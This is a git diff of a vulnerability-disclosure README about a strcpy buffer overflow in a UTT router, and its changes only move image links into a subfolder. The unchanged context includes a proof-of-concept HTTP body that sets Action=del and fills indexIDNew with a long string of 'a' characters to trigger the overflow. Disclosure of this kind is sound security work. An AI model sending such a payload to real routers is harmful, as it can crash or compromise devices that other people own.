@@ -22,17 +22,17 @@ A serious buffer overflow vulnerability was found on the UTT router Aggressive  
 
 The API for invoking the function
 
-![image-20260208191050792](README/image-20260208191050792.png)
+![image-20260208191050792](README/12/image-20260208191050792.png)
 
 Here are some values such as indexIDNew and Action
 
-![image-20260208191128104](README/image-20260208191128104.png)
+![image-20260208191128104](README/12/image-20260208191128104.png)
 
 When the action is not added, it enters the if judgment and causes an overflow through strcpy
 
-![image-20260208191230067](README/image-20260208191230067.png)
+![image-20260208191230067](README/12/image-20260208191230067.png)
 
-![image-20260208191247245](README/image-20260208191247245.png)
+![image-20260208191247245](README/12/image-20260208191247245.png)
 
 # POC
 
@@ -56,4 +56,4 @@ Connection: close
 Action=del&indexIDNew=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ```
 
-![image-20251118224225970](README/image-20251118224225970.png)
+![image-20251118224225970](README/12/image-20251118224225970.png)
